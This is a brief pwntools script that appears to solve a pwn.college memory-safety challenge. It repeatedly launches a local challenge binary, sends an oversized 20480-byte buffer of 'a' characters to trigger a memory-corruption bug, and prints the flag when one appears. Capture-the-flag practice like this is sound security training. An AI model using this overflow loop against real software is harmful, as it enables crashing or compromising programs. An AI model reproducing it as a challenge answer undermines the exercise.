from pwn import *

while True:
    p = process('/challenge/babymem_level11.0')

    p.recvuntil('Payload size:')
    p.sendline(b'20480')

    payload =  b'a' * 20480

    #p.recvline('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break

